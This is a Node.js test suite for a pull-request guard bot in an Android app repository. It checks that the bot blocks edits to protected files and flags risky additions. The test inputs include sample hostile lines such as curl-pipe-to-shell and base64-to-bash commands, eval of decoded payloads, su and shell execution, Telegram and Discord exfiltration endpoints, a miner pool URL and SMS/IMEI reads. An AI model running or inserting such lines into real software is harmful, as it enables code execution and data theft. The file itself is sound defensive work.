'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const guard = require('./pr-guard.js');

const ROOT = path.join(__dirname, '..', '..');
const patchOf = (...lines) => '@@ -0,0 +1,' + lines.length + ' @@\n' + lines.map((l) => '+' + l).join('\n');
const added = (filename, ...lines) => ({
  filename, status: 'added', patch: patchOf(...lines), additions: lines.length, deletions: 0, changes: lines.length,
});
const rules = (file) => guard.scanFile(file).map((f) => f.rule);
const high = (file) => guard.scanFile(file).filter((f) => f.sev === 'high').map((f) => f.rule);

function filledTemplate() {
  let t = fs.readFileSync(path.join(ROOT, '.github', 'pull_request_template.md'), 'utf8');
  t = t.replace(/- \[ \]/g, '- [x]');
  for (const h of ['Summary', 'What changed and why', 'How I tested it']) {
    t = t.replace(new RegExp('(## ' + h + '\\n)'), '$1\nThis is a real sentence about the change.\n');
  }
  return t;
}

// ------------------------------------------------------------------ protected files

test('protected paths', () => {
  for (const p of ['.github/workflows/build.yml', '.github/pull_request_template.md', '.github/scripts/pr-guard.js',
    'README.md', 'readme.md', './README.md', 'CODE_OF_CONDUCT.md', 'SECURITY.md', 'CONTRIBUTING.md',
    'ACCESSIBILITY.md', 'docs/README.md', 'docs/security.md', 'README.rst', 'README']) {
    assert.equal(guard.isProtectedPath(p), true, p);
  }
  for (const p of ['app/src/main/java/com/example/Foo.java', 'app/README.md', '.githubx/a.yml', 'docs/guide.md',
    'fastlane/metadata/android/en-US/changelogs/7.txt', 'tools/readme-helper.js', 'README.md.bak', 'src/.github/x']) {
    assert.equal(guard.isProtectedPath(p), false, p);
  }
});

test('renaming a protected file away is still caught', () => {
  const f = { filename: 'notes.txt', previous_filename: 'README.md', status: 'renamed', additions: 0, deletions: 0, changes: 0 };
  const r = guard.evaluate({ files: [f], isMaintainer: false, body: filledTemplate() });
  assert.deepEqual(r.protectedHits, ['notes.txt']);
  assert.ok(r.failures.length);
});

test('contributors cannot edit protected files, maintainers can', () => {
  const files = [added('.github/workflows/evil.yml', 'name: x'), added('README.md', 'hello world text here')];
  const outsider = guard.evaluate({ files, isMaintainer: false, body: filledTemplate() });
  assert.ok(outsider.failures.some((f) => f.includes('protected files')));
  assert.ok(outsider.labels.includes('protected-files'));
  const maintainer = guard.evaluate({ files, isMaintainer: true, body: '' });
  assert.equal(maintainer.failures.length, 0);
  assert.ok(!maintainer.labels.includes('protected-files'));
});

// ------------------------------------------------------------------ scanning: should be caught

test('flags dynamic code loading, native code and shell execution', () => {
  assert.ok(high(added('A.java', 'new DexClassLoader(path, dir, null, parent);')).includes('dynamic-code'));
  assert.ok(high(added('A.java', 'System.loadLibrary("payload");')).includes('native-load'));
  assert.ok(high(added('A.java', 'Runtime.getRuntime().exec("id");')).includes('shell-exec'));
  assert.ok(high(added('A.java', 'new ProcessBuilder("sh", "-c", cmd).start();')).includes('shell-exec'));
  assert.ok(high(added('A.java', 'Process p = Runtime.getRuntime().exec(new String[]{"su"});')).includes('shell-exec'));
  assert.ok(high(added('A.java', 'String s = "su";')).includes('root-su'));
});

test('flags exfiltration endpoints, miners, private data and abuse hooks', () => {
  assert.ok(high(added('A.java', 'url = "https://api.telegram.org/bot123:abc/sendMessage";')).includes('exfil-endpoint'));
  assert.ok(high(added('x.txt', 'https://discord.com/api/webhooks/1/2')).includes('exfil-endpoint'));
  assert.ok(high(added('A.java', 'pool = "stratum+tcp://pool.example:3333";')).includes('crypto-miner'));
  assert.ok(high(added('A.java', 'getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);')).includes('private-data'));
  assert.ok(high(added('A.java', 'String id = tm.getImei();')).includes('private-data'));
  assert.ok(high(added('M.xml', '<service android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">')).includes('accessibility-admin-abuse'));
  assert.ok(high(added('A.java', 'conn.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);')).includes('trust-all-tls'));
  assert.ok(high(added('T.java', 'public void checkServerTrusted(X509Certificate[] c, String a) {}')).includes('trust-all-tls'));
});

test('flags script and obfuscation tricks', () => {
  assert.ok(high(added('x.sh', 'curl -s http://x.test/a.sh | sh')).includes('pipe-to-shell'));
  assert.ok(high(added('x.sh', 'echo aGk= | base64 -d | bash')).includes('pipe-to-shell'));
  assert.ok(high(added('README.md', 'run: curl https://x.test/i | sudo bash')).includes('pipe-to-shell'));
  assert.ok(high(added('a.js', 'eval(atob(payload));')).includes('eval'));
  assert.ok(high(added('A.java', 'String s = "' + '\\x41'.repeat(20) + '";')).includes('hex-escape-run'));
  assert.ok(high(added('A.java', 'String s = "' + 'QUJD'.repeat(100) + '";')).includes('encoded-blob'));
  assert.ok(high(added('i.svg', '<svg onload="alert(1)"/>')).includes('svg-script'));
});

test('flags invisible unicode (Trojan Source) but not a leading BOM', () => {
  assert.ok(high(added('A.java', 'if (isAdmin) { /* \u202E } if (x) { */')).includes('hidden-unicode'));
  assert.ok(high(added('A.java', 'int a\u200B = 1;')).includes('hidden-unicode'));
  assert.ok(high(added('README.md', 'looks fine\u2066hidden')).includes('hidden-unicode'));
  assert.deepEqual(high(added('A.java', '\uFEFFpackage com.example;')), []);
});

test('flags binaries and archives, allows normal images', () => {
  for (const name of ['lib/payload.so', 'a.jar', 'tools/x.apk', 'gradle/wrapper/gradle-wrapper.jar', 'data.zip', 'x.dex', 'run.exe']) {
    assert.deepEqual(high({ filename: name, status: 'added', additions: 0, deletions: 0, changes: 0 }), ['binary-file'], name);
  }
  assert.deepEqual(high({ filename: 'res/drawable/x.png', status: 'added', additions: 0, deletions: 0, changes: 0 }), []);
  assert.deepEqual(high({ filename: 'mystery', status: 'added', additions: 0, deletions: 0, changes: 0 }), ['binary-file']);
  assert.deepEqual(high({ filename: '.gitkeep', status: 'added', additions: 0, deletions: 0, changes: 0 }), []);
  assert.deepEqual(rules({ filename: 'big.json', status: 'modified', additions: 5000, deletions: 1, changes: 5001 }), ['diff-too-large']);
});

test('manifest permissions: sensitive ones are high, others are a heads-up', () => {
  const m = (perm) => added('app/src/main/AndroidManifest.xml', '<uses-permission android:name="android.permission.' + perm + '" />');
  assert.ok(high(m('READ_SMS')).includes('dangerous-permission'));
  assert.ok(high(m('RECORD_AUDIO')).includes('dangerous-permission'));
  assert.ok(high(m('REQUEST_INSTALL_PACKAGES')).includes('dangerous-permission'));
  assert.ok(rules(m('VIBRATE')).includes('new-permission'));
  assert.ok(!high(m('VIBRATE')).length);
});

test('heads-ups for build files, versions, URLs, reflection', () => {
  assert.ok(rules(added('app/build.gradle.kts', 'versionCode = 9')).includes('version-change'));
  assert.ok(rules(added('app/build.gradle.kts', 'implementation("a:b:1")')).includes('build-config'));
  assert.ok(rules(added('A.java', 'String u = "https://evil.example.xyz/x";')).includes('new-url'));
  assert.ok(!rules(added('A.java', 'String u = "https://cloudflare-dns.com/dns-query";')).includes('new-url'));
  assert.ok(!rules(added('A.java', 'String u = "https://dns.google/dns-query";')).includes('new-url'));
  assert.ok(rules(added('A.java', 'Class.forName(name);')).includes('reflection'));
  assert.ok(rules(added('M.xml', '<activity android:exported="true"/>')).includes('exported-component'));
  assert.ok(rules(added('run.sh', 'echo hi')).includes('new-script'));
  assert.ok(rules({ filename: 'a.sh', status: 'changed', additions: 0, deletions: 0, changes: 0 }).includes('mode-change'));
});

// ------------------------------------------------------------------ scanning: should NOT be caught

test('ordinary code is not flagged', () => {
  const code = [
    'public class Foo {', '    private final ExecutorService workers = Executors.newCachedThreadPool();',
    '    void run() { workers.execute(new Runnable() { public void run() { } }); }',
    '    String id = UUID.randomUUID().toString();', '    Log.d("x", "su is not here");', '    int sum = a + b;',
    '    // see https://github.com/m-farhan-hamim/NetShield-DNS-Resolver-by-PSBDx',
    '    SecureRandom random = new SecureRandom();', '}',
  ];
  assert.deepEqual(guard.scanFile(added('Foo.java', ...code)), []);
  assert.deepEqual(rules(added('docs.md', 'Use `System.loadLibrary` carefully. Visit https://f-droid.org/packages/x')), []);
});

test('only added lines are scanned and line numbers are right', () => {
  const patch = ['@@ -10,3 +10,4 @@', ' context line', '-Runtime.getRuntime().exec("old");', '+int ok = 1;', '+String s = "su";', ' tail'].join('\n');
  const f = guard.scanFile({ filename: 'A.java', status: 'modified', patch, additions: 2, deletions: 1, changes: 3 });
  assert.equal(f.length, 1);
  assert.equal(f[0].rule, 'root-su');
  assert.equal(f[0].line, 12);
  assert.deepEqual(guard.addedLines(patch).map((l) => l.line), [11, 12]);
});

test('removed files are not scanned', () => {
  assert.deepEqual(guard.scanFile({ filename: 'a.so', status: 'removed', additions: 0, deletions: 0, changes: 0 }), []);
});

// ------------------------------------------------------------------ template

test('the shipped template, filled in, satisfies the bot (they stay in sync)', () => {
  assert.deepEqual(guard.checkTemplate(filledTemplate()), []);
});

test('the shipped template, left as it is, is rejected', () => {
  const problems = guard.checkTemplate(fs.readFileSync(path.join(ROOT, '.github', 'pull_request_template.md'), 'utf8'));
  assert.ok(problems.some((p) => p.includes('Summary')));
  assert.ok(problems.some((p) => p.includes('Type of change')));
  assert.ok(problems.length >= 10);
});

test('template problems are specific', () => {
  assert.ok(guard.checkTemplate('').length > 0);
  assert.ok(guard.checkTemplate(filledTemplate().replace('## How I tested it', '## Tests')).some((p) => p.includes('How I tested it')));
  assert.ok(guard.checkTemplate(filledTemplate().replace('- [x] I did not change versionName', '- [ ] I did not change versionName')).some((p) => p.includes('versionName')));
  assert.ok(guard.checkTemplate(filledTemplate().replace(/- \[x\] I understand every line.*\n/, '')).some((p) => p.includes('missing')));
  assert.ok(guard.checkTemplate(filledTemplate().replace(/- \[x\] (Bug fix|New feature|Accessibility improvement|Documentation only|Refactor or cleanup|Build or CI)/g, '- [ ] $1')).some((p) => p.includes('Type of change')));
});

// ------------------------------------------------------------------ decision

test('clean contributor pull request passes', () => {
  const r = guard.evaluate({ files: [added('app/src/main/java/com/example/Foo.java', 'int a = 1;')], isMaintainer: false, body: filledTemplate() });
  assert.deepEqual(r.failures, []);
  assert.deepEqual(r.labels, []);
});

test('risky pattern blocks a contributor but is only a heads-up for a maintainer', () => {
  const files = [added('A.java', 'Runtime.getRuntime().exec("x");')];
  const outsider = guard.evaluate({ files, isMaintainer: false, body: filledTemplate() });
  assert.ok(outsider.failures.some((f) => f.includes('risky')));
  assert.ok(outsider.labels.includes('security-review'));
  const maintainer = guard.evaluate({ files, isMaintainer: true, body: '' });
  assert.equal(maintainer.failures.length, 0);
  assert.ok(maintainer.warnings.some((w) => w.includes('Not blocking')));
  assert.ok(maintainer.labels.includes('security-review'));
});

test('incomplete form blocks a contributor but not a maintainer', () => {
  const files = [added('A.java', 'int a = 1;')];
  assert.ok(guard.evaluate({ files, isMaintainer: false, body: 'fixes stuff' }).labels.includes('incomplete-template'));
  assert.equal(guard.evaluate({ files, isMaintainer: true, body: 'fixes stuff' }).failures.length, 0);
});

test('the comment is safe to post', () => {
  const files = [added('weird`name.java', 'String s = "su"; // `inject` @everyone')];
  const text = guard.renderComment(guard.evaluate({ files, isMaintainer: false, body: '' }));
  assert.ok(text.startsWith(guard.MARKER));
  assert.ok(!/@everyone/.test(text) || /`[^`]*@everyone/.test(text));
  assert.ok(text.includes('not a malware scanner'));
});

// ------------------------------------------------------------------ the GitHub glue

function fakeGithub({ files, comments = [], permission, labels = [] }) {
  const calls = { comments: [], updates: [], added: [], removed: [], created: [] };
  const github = {
    paginate: async (fn) => (fn === 'listFiles' ? files : comments),
    rest: {
      repos: { getCollaboratorPermissionLevel: async () => { if (!permission) { const e = new Error('nf'); e.status = 404; throw e; } return { data: { permission } }; } },
      pulls: { listFiles: 'listFiles', get: async () => ({ data: {} }), update: async () => { calls.closed = true; } },
      issues: {
        listComments: 'listComments',
        getLabel: async () => { const e = new Error('nf'); e.status = 404; throw e; },
        createLabel: async ({ name }) => { calls.created.push(name); },
        addLabels: async ({ labels: l }) => { calls.added.push(...l); },
        removeLabel: async ({ name }) => { calls.removed.push(name); },
        createComment: async ({ body }) => { calls.comments.push(body); },
        updateComment: async ({ body }) => { calls.updates.push(body); },
      },
    },
  };
  return { github, calls };
}
const ctx = (user, association, body, labels = []) => ({
  repo: { owner: 'o', repo: 'r' },
  payload: { pull_request: { number: 7, user: { login: user }, author_association: association, body, labels, state: 'open' } },
});
const core = () => { const c = { failed: null, infos: [] }; c.info = (m) => c.infos.push(m); c.warning = () => {}; c.setFailed = (m) => { c.failed = m; }; return c; };

test('run(): outsider editing a protected file is failed, labelled and told why', async () => {
  const { github, calls } = fakeGithub({ files: [added('README.md', 'hello')] });
  const c = core();
  await guard.run({ github, context: ctx('stranger', 'NONE', filledTemplate()), core: c, env: {} });
  assert.ok(c.failed);
  assert.ok(calls.added.includes('protected-files'));
  assert.equal(calls.comments.length, 1);
  assert.ok(calls.comments[0].includes('protected files'));
});

test('run(): the owner is exempt and a clean owner pull request gets no comment', async () => {
  const { github, calls } = fakeGithub({ files: [added('README.md', 'hello'), added('.github/workflows/x.yml', 'name: x')] });
  const c = core();
  await guard.run({ github, context: ctx('m-farhan-hamim', 'OWNER', ''), core: c, env: {} });
  assert.equal(c.failed, null);
  assert.equal(calls.comments.length, 0);
  assert.deepEqual(calls.added, []);
});

test('run(): a collaborator with admin/maintain permission is exempt, write is not', async () => {
  for (const [permission, exempt] of [['admin', true], ['maintain', true], ['write', false], ['read', false], [undefined, false]]) {
    const { github } = fakeGithub({ files: [added('SECURITY.md', 'x')], permission });
    const c = core();
    await guard.run({ github, context: ctx('someone', 'COLLABORATOR', filledTemplate()), core: c, env: {} });
    assert.equal(c.failed === null, exempt, String(permission));
  }
});

test('run(): updates its own comment instead of posting a new one, and drops stale labels', async () => {
  const old = { id: 5, body: guard.MARKER + '\nold text' };
  const { github, calls } = fakeGithub({ files: [added('A.java', 'int a = 1;')], comments: [old] });
  const c = core();
  await guard.run({ github, context: ctx('stranger', 'NONE', filledTemplate(), ['protected-files', 'other']), core: c, env: {} });
  assert.equal(c.failed, null);
  assert.equal(calls.comments.length, 0);
  assert.equal(calls.updates.length, 1);
  assert.deepEqual(calls.removed, ['protected-files']);
});

test('run(): dry run posts nothing', async () => {
  const { github, calls } = fakeGithub({ files: [added('README.md', 'hi')] });
  const c = core();
  await guard.run({ github, context: ctx('stranger', 'NONE', ''), core: c, env: { DRY_RUN: 'true' } });
  assert.equal(c.failed, null);
  assert.equal(calls.comments.length + calls.added.length + calls.created.length, 0);
});

// ------------------------------------------------------------------ the real codebase

test('the existing codebase raises no high-severity finding (no false alarms)', () => {
  const skipDirs = new Set(['.git', '.gradle', 'build', 'node_modules', '.github']);
  const textExt = new Set(['java', 'kt', 'kts', 'gradle', 'xml', 'pro', 'properties', 'toml', 'json', 'yml', 'yaml', 'js', 'py', 'sh', 'md', 'txt']);
  const hits = [];
  let scanned = 0;
  (function walk(dir) {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      if (entry.isDirectory()) { if (!skipDirs.has(entry.name)) walk(path.join(dir, entry.name)); continue; }
      const full = path.join(dir, entry.name);
      const rel = path.relative(ROOT, full).split(path.sep).join('/');
      if (!textExt.has(guard.extOf(rel))) continue;
      if (rel === 'README.md' || rel === 'SECURITY.md' || rel === 'CODE_OF_CONDUCT.md') continue; // protected, edited by the owner only
      const lines = fs.readFileSync(full, 'utf8').split('\n');
      scanned++;
      for (const f of guard.scanFile(added(rel, ...lines))) if (f.sev === 'high') hits.push(f.file + ':' + f.line + ' ' + f.rule + ' ' + f.text);
    }
  })(ROOT);
  assert.ok(scanned > 50, 'scanned ' + scanned + ' files');
  // The one known, deliberate high-risk item in the app today: the self-updater installs APKs, which
  // needs this permission. A pull request that ADDS it would be flagged; the existing line is not
  // touched. Any other high-severity pattern appearing in the codebase makes this test fail.
  const knownBaseline = ['app/src/main/AndroidManifest.xml:12 dangerous-permission '
    + '<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />'];
  assert.deepEqual(hits, knownBaseline);
});
